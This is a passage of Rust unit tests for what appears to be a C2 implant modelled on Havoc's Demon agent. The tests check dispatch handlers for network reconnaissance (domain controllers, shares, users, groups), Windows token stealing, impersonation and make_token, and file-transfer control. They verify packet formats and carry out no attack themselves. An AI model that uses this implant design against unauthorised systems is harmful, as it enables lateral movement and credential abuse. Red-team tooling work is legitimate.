    }

    #[test]
    fn handle_net_logons_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        // Subcommand only, no server name.
        let package = net_package(DemonNetCommand::Logons, &[]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_sessions_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("DC01");
        let package = net_package(DemonNetCommand::Sessions, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Sessions));
    }

    #[test]
    fn handle_net_sessions_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Sessions, &[]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_computer_echoes_domain_and_correct_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("CORP.LOCAL");
        let package = net_package(DemonNetCommand::Computer, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Computer));
        // Domain name must be echoed as len-prefixed UTF-16LE after subcmd.
        let domain_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let domain = decode_utf16le_null(&resp.payload[8..8 + domain_len]);
        assert_eq!(domain, "CORP.LOCAL");
        // On non-Windows there is no NetServerEnum — list is empty, payload ends after domain.
        #[cfg(not(windows))]
        assert_eq!(resp.payload.len(), 8 + domain_len);
    }

    #[test]
    fn handle_net_computer_missing_domain_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Computer, &[]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_dclist_echoes_domain_and_correct_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("CORP.LOCAL");
        let package = net_package(DemonNetCommand::DcList, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::DcList));
        // Domain name must be echoed as len-prefixed UTF-16LE after subcmd.
        let domain_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let domain = decode_utf16le_null(&resp.payload[8..8 + domain_len]);
        assert_eq!(domain, "CORP.LOCAL");
        // On non-Windows there is no NetServerEnum — list is empty, payload ends after domain.
        #[cfg(not(windows))]
        assert_eq!(resp.payload.len(), 8 + domain_len);
    }

    #[test]
    fn handle_net_dclist_missing_domain_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::DcList, &[]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_share_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("FILESERV");
        let package = net_package(DemonNetCommand::Share, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Share));
    }

    #[test]
    fn handle_net_share_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Share, &[]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_localgroup_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("WORKSTATION");
        let package = net_package(DemonNetCommand::LocalGroup, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::LocalGroup));
        // Server name echoed.
        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let server = decode_utf16le_null(&resp.payload[8..8 + server_len]);
        assert_eq!(server, "WORKSTATION");
    }

    #[test]
    fn handle_net_localgroup_has_groups_from_etc_group() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("localhost");
        let package = net_package(DemonNetCommand::LocalGroup, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        // On any Linux system /etc/group has at least "root".
        // Response = subcmd(4) + server(4+N) + [group_name(4+N) + description(4+N)]...
        // So payload must be longer than just subcmd + server.
        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let after_server = 8 + server_len;
        assert!(
            resp.payload.len() > after_server,
            "expected at least one group entry; payload len = {}",
            resp.payload.len()
        );
    }

    #[test]
    fn handle_net_group_echoes_subcmd_8() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("DC01");
        let package = net_package(DemonNetCommand::Group, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Group));
    }

    #[test]
    fn handle_net_users_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("HOST01");
        let package = net_package(DemonNetCommand::Users, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Users));
    }

    #[test]
    fn handle_net_users_includes_root_as_admin() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("localhost");
        let package = net_package(DemonNetCommand::Users, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        // Parse response to find "root" with is_admin=true.
        let p = &resp.payload;
        let mut pos = 4; // skip subcmd
        // Skip server name.
        let server_len = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("len")) as usize;
        pos += 4 + server_len;
        // Iterate user entries: [name: LE-len-prefixed UTF-16LE][is_admin: u32 LE]
        let mut found_root = false;
        while pos + 4 <= p.len() {
            let name_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
            pos += 4;
            if pos + name_len + 4 > p.len() {
                break;
            }
            let name = decode_utf16le_null(&p[pos..pos + name_len]);
            pos += name_len;
            let is_admin = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("admin"));
            pos += 4;
            if name == "root" {
                assert_eq!(is_admin, 1, "root must be flagged as admin");
                found_root = true;
            }
        }
        assert!(found_root, "root user not found in user list");
    }

    #[test]
    fn handle_net_users_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Users, &[]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    // ── CommandToken helpers ────────────────────────────────────────────────

    /// Build a CommandToken package with the given subcommand and args.
    fn token_package(subcmd: DemonTokenCommand, args: &[u8]) -> DemonPackage {
        let mut payload = (u32::from(subcmd)).to_le_bytes().to_vec();
        payload.extend_from_slice(args);
        DemonPackage::new(DemonCommand::CommandToken, 1, payload)
    }

    // ── Token::Impersonate ──────────────────────────────────────────────────

    #[test]
    fn token_impersonate_nonexistent_returns_failure() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        // Token ID 99 doesn't exist.
        let args = 99u32.to_le_bytes().to_vec();
        let package = token_package(DemonTokenCommand::Impersonate, &args);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
        // Parse: [subcmd: u32][success: u32]
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::Impersonate));
        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
        assert_eq!(success, 0); // FALSE — token not found
    }

    // ── Token::List ─────────────────────────────────────────────────────────

    #[test]
    fn token_list_empty_vault() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let package = token_package(DemonTokenCommand::List, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
        // Only the subcmd header, no entries.
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::List));
        assert_eq!(off, resp.payload.len()); // no more data
    }

    #[test]
    fn token_list_with_entries() {
        use crate::token::{TokenEntry, TokenType};

        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        vault.add(TokenEntry {
            handle: 0xAA,
            domain_user: "DOM\\user1".to_string(),
            process_id: 100,
            token_type: TokenType::Stolen,
            credentials: None,
        });
        vault.add(TokenEntry {
            handle: 0xBB,
            domain_user: "DOM\\user2".to_string(),
            process_id: 200,
            token_type: TokenType::MakeNetwork,
            credentials: None,
        });

        let package = token_package(DemonTokenCommand::List, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };

        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::List));

        // Entry 0
        let idx0 = parse_u32_le(&resp.payload, &mut off).expect("idx0");
        assert_eq!(idx0, 0);
        let handle0 = parse_u32_le(&resp.payload, &mut off).expect("handle0");
        assert_eq!(handle0, 0xAA);
        let user0_bytes = parse_bytes_le(&resp.payload, &mut off).expect("user0");
        let user0 = decode_utf16le_null(&user0_bytes);
        assert_eq!(user0, "DOM\\user1");
        let pid0 = parse_u32_le(&resp.payload, &mut off).expect("pid0");
        assert_eq!(pid0, 100);
        let type0 = parse_u32_le(&resp.payload, &mut off).expect("type0");
        assert_eq!(type0, TokenType::Stolen as u32);
        let imp0 = parse_u32_le(&resp.payload, &mut off).expect("imp0");
        assert_eq!(imp0, 0); // not impersonating

        // Entry 1
        let idx1 = parse_u32_le(&resp.payload, &mut off).expect("idx1");
        assert_eq!(idx1, 1);
        let _handle1 = parse_u32_le(&resp.payload, &mut off).expect("handle1");
        let _user1_bytes = parse_bytes_le(&resp.payload, &mut off).expect("user1");
        let pid1 = parse_u32_le(&resp.payload, &mut off).expect("pid1");
        assert_eq!(pid1, 200);
        let type1 = parse_u32_le(&resp.payload, &mut off).expect("type1");
        assert_eq!(type1, TokenType::MakeNetwork as u32);
    }

    // ── Token::GetUid ───────────────────────────────────────────────────────

    #[test]
    fn token_getuid_returns_respond() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let package = token_package(DemonTokenCommand::GetUid, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::GetUid));
        // elevated: u32
        let _elevated = parse_u32_le(&resp.payload, &mut off).expect("elevated");
        // user: wbytes (length-prefixed)
        let user_bytes = parse_bytes_le(&resp.payload, &mut off).expect("user");
        let user = decode_utf16le_null(&user_bytes);
        assert!(!user.is_empty(), "user string should not be empty");
    }

    // ── Token::Revert ───────────────────────────────────────────────────────

    #[test]
    fn token_revert_returns_respond() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let package = token_package(DemonTokenCommand::Revert, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::Revert));
        // On non-Windows: revert_to_self returns Err, so success = 0.
        // On Windows: success depends on thread state.
        let _success = parse_u32_le(&resp.payload, &mut off).expect("success");
    }

    // ── Token::Remove ───────────────────────────────────────────────────────

    #[test]
    fn token_remove_nonexistent_returns_failure() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let args = 42u32.to_le_bytes().to_vec();
        let package = token_package(DemonTokenCommand::Remove, &args);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::Remove));
        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
        assert_eq!(success, 0); // FALSE — no such token
        let returned_id = parse_u32_le(&resp.payload, &mut off).expect("token_id");
        assert_eq!(returned_id, 42);
    }

    #[test]
    fn token_remove_existing_returns_success() {
        use crate::token::{TokenEntry, TokenType};

        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let id = vault.add(TokenEntry {
            handle: 0,
            domain_user: "D\\U".to_string(),
            process_id: 1,
            token_type: TokenType::Stolen,
            credentials: None,
        });

        let args = id.to_le_bytes().to_vec();
        let package = token_package(DemonTokenCommand::Remove, &args);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let _subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
        assert_eq!(success, 1); // TRUE
        assert!(vault.get(id).is_none());
    }

    // ── Token::Clear ────────────────────────────────────────────────────────

    #[test]
    fn token_clear_empties_vault() {
        use crate::token::{TokenEntry, TokenType};

        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        vault.add(TokenEntry {
            handle: 0,
            domain_user: "D\\U".to_string(),
            process_id: 1,
            token_type: TokenType::Stolen,
            credentials: None,
        });

        let package = token_package(DemonTokenCommand::Clear, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::Clear));
        assert!(vault.is_empty());
    }

    // ── Token::FindTokens ───────────────────────────────────────────────────

    #[test]
    fn token_find_returns_success_with_empty_list_on_non_windows() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let package = token_package(DemonTokenCommand::FindTokens, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::FindTokens));
        // On non-Windows the stub returns success=TRUE with count=0.
        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
        assert_eq!(success, 1);
        let count = parse_u32_le(&resp.payload, &mut off).expect("count");
        assert_eq!(count, 0);
    }

    // ── Token::PrivsGetOrList ───────────────────────────────────────────────

    #[test]
    fn token_privs_list_returns_respond() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        // list_privs = 1 (list mode)
        let args = 1u32.to_le_bytes().to_vec();
        let package = token_package(DemonTokenCommand::PrivsGetOrList, &args);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::PrivsGetOrList));
        let list_flag = parse_u32_le(&resp.payload, &mut off).expect("list_privs");
        assert_eq!(list_flag, 1);
    }

    // ── Token::Steal ────────────────────────────────────────────────────────

    #[test]
    fn token_steal_invalid_pid_returns_ignore() {
        // On non-Windows, steal always fails; on Windows, PID 0 is invalid.
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let mut args = Vec::new();
        args.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
        args.extend_from_slice(&0u32.to_le_bytes()); // handle = 0
        let package = token_package(DemonTokenCommand::Steal, &args);
        // On non-Windows stubs, steal returns Err → DispatchResult::Ignore.
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── Token::Make ─────────────────────────────────────────────────────────

    #[test]
    fn token_make_returns_respond_on_non_windows() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();

        // Build args: [domain: wbytes][user: wbytes][password: wbytes][logon_type: u32]
        let mut args = Vec::new();
        let to_wbytes = |s: &str| -> Vec<u8> {
            let utf16: Vec<u8> = s
                .encode_utf16()
                .chain(std::iter::once(0u16))
                .flat_map(|c| c.to_le_bytes())
                .collect();
            let mut b = (utf16.len() as u32).to_le_bytes().to_vec();
            b.extend_from_slice(&utf16);
            b
        };
        args.extend_from_slice(&to_wbytes("DOMAIN"));
        args.extend_from_slice(&to_wbytes("user"));
        args.extend_from_slice(&to_wbytes("pass"));
        args.extend_from_slice(&9u32.to_le_bytes()); // LOGON32_LOGON_NEW_CREDENTIALS

        let package = token_package(DemonTokenCommand::Make, &args);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        ) else {
            panic!("expected Respond");
        };
        // On non-Windows: make_token fails, so response has subcmd but no domain_user.
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::Make));
        // Vault should remain empty on failure.
        assert!(vault.is_empty());
    }

    // ── Token dispatch: unknown subcommand ──────────────────────────────────

    #[test]
    fn token_unknown_subcommand_returns_ignore() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        // Subcommand 255 is not defined.
        let payload = 255u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandToken, 1, payload);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut vault,
                &mut downloads,
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn token_empty_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let package = DemonPackage::new(DemonCommand::CommandToken, 1, vec![]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut vault,
                &mut downloads,
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
                &crate::coffeeldr::new_bof_output_queue(),
            ),
            DispatchResult::Ignore
        ));
    }

    // ── CommandTransfer tests ───────────────────────────────────────────────

    /// Build a CommandTransfer payload: `[subcmd: u32 LE][args…]`
    fn transfer_payload(subcmd: u32, args: &[u8]) -> Vec<u8> {
        let mut v = subcmd.to_le_bytes().to_vec();
        v.extend_from_slice(args);
        v
    }

    #[test]
    fn transfer_list_empty_returns_subcmd_only() {
        let payload = transfer_payload(0, &[]); // List = 0
        let downloads = DownloadTracker::new();
        let result = handle_transfer(&payload, &mut { downloads });
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandTransfer));
        // Payload: just the subcommand echo (4 bytes).
        assert_eq!(resp.payload.len(), 4);
        let subcmd_echo = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(subcmd_echo, 0); // List
    }

    #[test]
    fn transfer_list_with_active_download() {
        let mut downloads = DownloadTracker::new();
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_tl_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write");
        let file = std::fs::File::open(&path).expect("open");
        let file_id = downloads.add(file, 1, 4);

        let payload = transfer_payload(0, &[]);
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // Payload: subcmd(4) + file_id(4) + read_size(4) + state(4) = 16 bytes
        assert_eq!(resp.payload.len(), 16);
        let listed_id = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(listed_id, file_id);
        let state = u32::from_le_bytes(resp.payload[12..16].try_into().expect("u32"));
        assert_eq!(state, 1); // Running
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn transfer_stop_found() {
        let mut downloads = DownloadTracker::new();
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_ts_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write");
        let file = std::fs::File::open(&path).expect("open");
        let file_id = downloads.add(file, 1, 4);

        let payload = transfer_payload(1, &file_id.to_le_bytes());
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // [subcmd(4)][found(4)][file_id(4)]
        assert_eq!(resp.payload.len(), 12);
        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(found, 1);
        assert_eq!(downloads.get(file_id).expect("entry").state, DownloadState::Stopped);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn transfer_stop_not_found() {
        let mut downloads = DownloadTracker::new();
        let payload = transfer_payload(1, &0xDEADu32.to_le_bytes());
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(found, 0);
    }

    #[test]
    fn transfer_resume_found() {
        let mut downloads = DownloadTracker::new();
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_tr_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write");
        let file = std::fs::File::open(&path).expect("open");
        let file_id = downloads.add(file, 1, 4);
        downloads.get_mut(file_id).expect("entry").state = DownloadState::Stopped;

        let payload = transfer_payload(2, &file_id.to_le_bytes());
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(found, 1);
        assert_eq!(downloads.get(file_id).expect("entry").state, DownloadState::Running);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn transfer_remove_found_returns_multi_respond() {
        let mut downloads = DownloadTracker::new();
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_trm_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write");
        let file = std::fs::File::open(&path).expect("open");
        let file_id = downloads.add(file, 1, 4);

        let payload = transfer_payload(3, &file_id.to_le_bytes());
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::MultiRespond(resps) = result else {
            panic!("expected MultiRespond, got {result:?}");
        };
        assert_eq!(resps.len(), 2);
        // First: [subcmd][found=1][file_id]
        let found = u32::from_le_bytes(resps[0].payload[4..8].try_into().expect("u32"));
        assert_eq!(found, 1);
        // Second: [subcmd][file_id][reason=REMOVED(1)]
        let reason = u32::from_le_bytes(resps[1].payload[8..12].try_into().expect("u32"));
        assert_eq!(reason, DOWNLOAD_REASON_REMOVED);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn transfer_remove_not_found_returns_single() {
        let mut downloads = DownloadTracker::new();
        let payload = transfer_payload(3, &0xBEEFu32.to_le_bytes());
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(found, 0);
    }

    #[test]
    fn transfer_unknown_subcommand_returns_ignore() {
        let mut downloads = DownloadTracker::new();
        let payload = transfer_payload(255, &[]);
        let result = handle_transfer(&payload, &mut downloads);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn transfer_empty_payload_returns_ignore() {
        let mut downloads = DownloadTracker::new();
        let result = handle_transfer(&[], &mut downloads);
